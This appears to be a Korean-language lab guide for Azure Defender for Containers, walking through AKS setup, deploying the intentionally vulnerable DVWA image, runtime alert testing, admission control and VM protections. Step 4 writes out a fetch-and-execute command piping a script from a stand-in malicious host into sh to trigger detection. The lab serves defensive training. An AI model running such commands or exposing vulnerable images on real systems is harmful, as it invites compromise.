# Module 7. Advanced CWPP Lab – Full Scenario

## 목표
Defender for Containers (CWPP)의 agentless scanning ➔ agent-based runtime protection ➔ VM 보호 기능(JIT, AAC, FIM)까지 end-to-end 보안 시나리오 실습

---

## ✅ Lab 전체 흐름
1. AKS 클러스터 배포
2. ACR 통합 + 취약 이미지 배포
3. Defender for Containers agent-based onboarding
4. Runtime protection 기능 검증
5. Admission control policy 구성
6. JIT / AAC / FIM 설정 (노드풀 VM)
7. Alert & Recommendation 분석

--- 

## Lab 진행 

### Step 1. AKS 클러스터 배포
**목표:** AKS(AKS = Azure Kubernetes Service) 클러스터 구축 및 실습 환경 준비

### 작업(Windows/mac 동일) 

# 리소스 그룹 생성
```bash
az group create --name CWPP-Lab-RG --location koreacentral
```

# AKS 클러스터 생성
```bash
az aks create \
  --resource-group CWPP-Lab-RG \
  --name cwppaks \
  --node-count 1 \
  --enable-addons monitoring \
  --generate-ssh-keys
```

# AKS 클러스터 인증 구성
```bash
az aks get-credentials --resource-group CWPP-Lab-RG --name cwppaks
```

# 노드 풀 확인
```bash
kubectl get nodes
```

### 결과
✅ AKS 클러스터 생성 완료

---

### Step 2. ACR 통합 + 취약 이미지 배포
**목표:** ACR에서 취약 이미지를 pull하여 AKS에 배포

### 작업
```bash
# ACR login
az acr login --name <YourContainerRegistryName>

# imagePullSecret 생성
kubectl create secret docker-registry acr-secret \
  --docker-server=<YourContainerRegistryName>.azurecr.io \
  --docker-username=<ACR_USERNAME> \
  --docker-password=<ACR_PASSWORD>

# DVWA deployment manifest 작성 (dvwa-deployment.yaml)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dvwa
spec:
  replicas: 1
  selector:
    matchLabels:
      app: dvwa
  template:
    metadata:
      labels:
        app: dvwa
    spec:
      containers:
      - name: dvwa
        image: <YourContainerRegistryName>.azurecr.io/vulnerables/web-dvwa
      imagePullSecrets:
      - name: acr-secret
---
apiVersion: v1
kind: Service
metadata:
  name: dvwa
spec:
  type: LoadBalancer
  ports:
  - port: 80
    targetPort: 80
  selector:
    app: dvwa
```

```bash
# 배포
kubectl apply -f dvwa-deployment.yaml

# 배포 상태 확인
kubectl get pods
kubectl get svc
```

### 결과
✅ DVWA pod 실행 확인

---

### Step 3. Defender for Containers agent-based onboarding
**목표:** runtime protection 기능 활성화

### 작업
1. MDC ➔ Environment settings ➔ Subscription ➔ Defender Plans ➔ **Defender for Containers Enable**
2. Onboarding 방법 선택:
   - Azure Policy 자동 배포
   - 수동 Helm install (선택 시 아래 실행)

```bash
# helm repo 추가
helm repo add azure-defender https://raw.githubusercontent.com/Azure/azure-defender-for-kubernetes/main/charts
helm repo update

# Helm install
helm install azure-defender-for-kubernetes azure-defender/azure-defender-for-kubernetes
```

3. DaemonSet 배포 확인
```bash
kubectl get daemonset -n azure-defender
```

### 결과
✅ agent-based protection 활성화 완료

---

### Step 4. Runtime protection 기능 검증
**목표:** 실행 중인 컨테이너 보호 기능 확인

### 작업
```bash
# DVWA pod 진입
kubectl exec -it <dvwa-pod-name> -- /bin/bash

# suspicious process 실행 예시
curl http://malicious-site.com/malware.sh | sh
```

1. MDC ➔ Alerts에서 탐지 여부 확인

### 결과
✅ runtime protection alert 확인

---

### Step 5. Admission control policy 구성
**목표:** 취약 이미지 배포 차단

### 작업
1. MDC ➔ Defender for Containers ➔ Admission control policy ➔ **Enable**
2. Policy: High severity vulnerability 이미지 배포 차단
3. DVWA 취약 이미지 redeploy 시도 ➔ 배포 실패 확인

```bash
kubectl delete -f dvwa-deployment.yaml
kubectl apply -f dvwa-deployment.yaml
```

### 결과
✅ admission controller 차단 기능 검증

---

### Step 6. JIT / AAC / FIM 설정 (노드풀 VM)
**목표:** CWPP VM 보호 기능 실습

### 작업
#### 🔹 JIT
1. MDC ➔ Just-In-Time VM Access ➔ Node pool VM ➔ JIT 구성
2. SSH 포트 요청 ➔ 승인 ➔ 접속 확인

#### 🔹 AAC
1. MDC ➔ Adaptive Application Controls ➔ Node pool VM ➔ 정책 적용
2. 승인되지 않은 binary 실행 ➔ 차단 여부 확인

#### 🔹 FIM
1. MDC ➔ File Integrity Monitoring ➔ Node pool VM ➔ 보호 경로 파일 변경 ➔ alert 발생 여부 확인

### 결과
✅ VM 보호 기능 실습 완료

---

### Step 7. Alert & Recommendation 분석
**목표:** 탐지된 alert 및 remediation recommendation 분석

### 작업
1. MDC ➔ Alerts ➔ Container & VM 탐지 내용 검토
2. MDC ➔ Recommendations ➔ remediation guidance 확인

### 결과
✅ CWPP 탐지 및 대응 워크플로우 이해


